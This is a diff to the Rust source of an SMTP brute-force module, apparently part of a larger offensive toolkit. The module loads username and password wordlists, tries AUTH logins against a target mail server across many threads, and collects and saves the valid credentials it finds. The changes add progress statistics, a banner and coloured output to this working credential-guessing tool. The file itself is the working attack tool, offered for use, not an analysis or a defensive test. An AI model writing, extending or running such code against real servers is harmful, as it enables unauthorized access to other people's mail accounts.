@@ -1,16 +1,96 @@
 use anyhow::{anyhow, Context, Result};
-use colored::Colorize;
+use colored::*;
 use regex::Regex;
 use std::fs::{File, OpenOptions};
 use std::io::{self, BufRead, BufReader, Write};
 use std::net::{TcpStream, ToSocketAddrs};
 use std::path::Path;
 use std::sync::{Arc, Mutex};
-use std::sync::atomic::{AtomicBool, Ordering};
-use std::time::Duration;
+use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
+use std::time::{Duration, Instant};
 use telnet::{Telnet, Event};
 use threadpool::ThreadPool;
 use crossbeam_channel::unbounded;
+
+const PROGRESS_INTERVAL_SECS: u64 = 2;
+
+struct Statistics {
+    total_attempts: AtomicU64,
+    successful_attempts: AtomicU64,
+    failed_attempts: AtomicU64,
+    error_attempts: AtomicU64,
+    start_time: Instant,
+}
+
+impl Statistics {
+    fn new() -> Self {
+        Self {
+            total_attempts: AtomicU64::new(0),
+            successful_attempts: AtomicU64::new(0),
+            failed_attempts: AtomicU64::new(0),
+            error_attempts: AtomicU64::new(0),
+            start_time: Instant::now(),
+        }
+    }
+
+    fn record_attempt(&self, success: bool, error: bool) {
+        self.total_attempts.fetch_add(1, Ordering::Relaxed);
+        if error {
+            self.error_attempts.fetch_add(1, Ordering::Relaxed);
+        } else if success {
+            self.successful_attempts.fetch_add(1, Ordering::Relaxed);
+        } else {
+            self.failed_attempts.fetch_add(1, Ordering::Relaxed);
+        }
+    }
+
+    fn print_progress(&self) {
+        let total = self.total_attempts.load(Ordering::Relaxed);
+        let success = self.successful_attempts.load(Ordering::Relaxed);
+        let failed = self.failed_attempts.load(Ordering::Relaxed);
+        let errors = self.error_attempts.load(Ordering::Relaxed);
+        let elapsed = self.start_time.elapsed().as_secs_f64();
+        let rate = if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 };
+
+        print!(
+            "\r{} {} attempts | {} OK | {} fail | {} err | {:.1}/s    ",
+            "[Progress]".cyan(),
+            total.to_string().bold(),
+            success.to_string().green(),
+            failed,
+            errors.to_string().red(),
+            rate
+        );
+        let _ = std::io::stdout().flush();
+    }
+
+    fn print_final(&self) {
+        println!();
+        let total = self.total_attempts.load(Ordering::Relaxed);
+        let success = self.successful_attempts.load(Ordering::Relaxed);
+        let failed = self.failed_attempts.load(Ordering::Relaxed);
+        let errors = self.error_attempts.load(Ordering::Relaxed);
+        let elapsed = self.start_time.elapsed().as_secs_f64();
+
+        println!("{}", "=== Statistics ===".bold());
+        println!("  Total attempts:    {}", total);
+        println!("  Successful:        {}", success.to_string().green().bold());
+        println!("  Failed:            {}", failed);
+        println!("  Errors:            {}", errors.to_string().red());
+        println!("  Elapsed time:      {:.2}s", elapsed);
+        if elapsed > 0.0 {
+            println!("  Average rate:      {:.1} attempts/s", total as f64 / elapsed);
+        }
+    }
+}
+
+fn display_banner() {
+    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
+    println!("{}", "║   SMTP Brute Force Module                                 ║".cyan());
+    println!("{}", "║   Supports AUTH PLAIN and AUTH LOGIN                      ║".cyan());
+    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
+    println!();
+}
 
 #[derive(Clone)]
 struct SmtpBruteforceConfig {
@@ -25,7 +105,9 @@ struct SmtpBruteforceConfig {
 }
 
 pub async fn run(target: &str) -> Result<()> {
-    println!("\n=== SMTP Bruteforce ===\n");
+    display_banner();
+    println!("{}", format!("[*] Target: {}", target).cyan());
+    println!();
     let port = prompt_port(25);
     let username_wordlist = prompt_wordlist("Username wordlist file: ")?;
     let password_wordlist = prompt_wordlist("Password wordlist file: ")?;
@@ -53,10 +135,20 @@ fn run_smtp_bruteforce(config: SmtpBruteforceConfig) -> Result<()> {
     if usernames.is_empty() || passwords.is_empty() {
         return Err(anyhow!("Username or password wordlist is empty."));
     }
-    println!("[*] Loaded {} username(s).", usernames.len());
-    println!("[*] Loaded {} password(s).", passwords.len());
+    println!("{}", format!("[*] Loaded {} username(s).", usernames.len()).cyan());
+    println!("{}", format!("[*] Loaded {} password(s).", passwords.len()).cyan());
+    
+    let total_attempts = if config.full_combo { 
+        usernames.len() * passwords.len() 
+    } else { 
+        passwords.len() 
+    };
+    println!("{}", format!("[*] Total attempts: {}", total_attempts).cyan());
+    println!();
+    
     let found = Arc::new(Mutex::new(Vec::new()));
     let stop_flag = Arc::new(AtomicBool::new(false));
+    let stats = Arc::new(Statistics::new());
     let pool = ThreadPool::new(config.threads);
     let (tx, rx) = unbounded();
     if config.full_combo {
@@ -69,43 +161,72 @@ fn run_smtp_bruteforce(config: SmtpBruteforceConfig) -> Result<()> {
         for p in &passwords { tx.send((usernames[0].clone(), p.clone()))?; }
     }
     drop(tx);
+    
+    // Start progress reporter thread
+    let progress_stop = Arc::clone(&stop_flag);
+    let progress_stats = Arc::clone(&stats);
+    let progress_handle = std::thread::spawn(move || {
+        while !progress_stop.load(Ordering::Relaxed) {
+            progress_stats.print_progress();
+            std::thread::sleep(Duration::from_secs(PROGRESS_INTERVAL_SECS));
+        }
+    });
+    
     for _ in 0..config.threads {
         let rx = rx.clone();
         let addr = addr.clone();
         let stop_flag = Arc::clone(&stop_flag);
         let found = Arc::clone(&found);
+        let stats = Arc::clone(&stats);
         let config = config.clone();
         pool.execute(move || {
             while let Ok((user, pass)) = rx.recv() {
                 if stop_flag.load(Ordering::Relaxed) { break; }
-                if config.verbose { println!("[*] {}:{}", user, pass); }
                 match try_smtp_login(&addr, &user, &pass) {
                     Ok(true) => {
-                        println!("[+] VALID: {}:{}", user, pass);
+                        println!("\r{}", format!("[+] VALID: {}:{}", user, pass).green().bold());
                         let mut creds = found.lock().unwrap(); creds.push((user.clone(), pass.clone()));
+                        stats.record_attempt(true, false);
                         if config.stop_on_success {
                             stop_flag.store(true, Ordering::Relaxed);
                             while rx.try_recv().is_ok() {}
                             break;
                         }
                     }
-                    Ok(false) => {}
-                    Err(e) => if config.verbose { eprintln!("[!] {}:{}: {}", user, pass, e); },
+                    Ok(false) => {
+                        stats.record_attempt(false, false);
+                        if config.verbose {
+                            println!("\r{}", format!("[-] Failed: {}:{}", user, pass).dimmed());
+                        }
+                    }
+                    Err(e) => {
+                        stats.record_attempt(false, true);
+                        if config.verbose { 
+                            eprintln!("\r{}", format!("[!] {}:{}: {}", user, pass, e).red()); 
+                        }
+                    }
                 }
             }
         });
     }
     pool.join();
+    
+    // Stop progress reporter
+    stop_flag.store(true, Ordering::Relaxed);
+    let _ = progress_handle.join();
+    
+    // Print final statistics
+    stats.print_final();
     let found = found.lock().unwrap();
     if found.is_empty() {
-        println!("[-] No valid credentials.");
+        println!("{}", "[-] No valid credentials found.".yellow());
     } else {
-        println!("[+] Found:");
-        for (u,p) in found.iter() { println!("{}:{}", u, p); }
-        if prompt("Save found? (y/n): ").trim().eq_ignore_ascii_case("y") {
+        println!("{}", format!("[+] Found {} valid credential(s):", found.len()).green().bold());
+        for (u,p) in found.iter() { println!("  {}  {}:{}", "✓".green(), u, p); }
+        if prompt("\nSave found? (y/n): ").trim().eq_ignore_ascii_case("y") {
             let f = prompt("Filename: ");
             save_results(&f, &found)?;
-            println!("[+] Saved to {}", f);
+            println!("{}", format!("[+] Results saved to {}", f).green());
         }
     }
     Ok(())
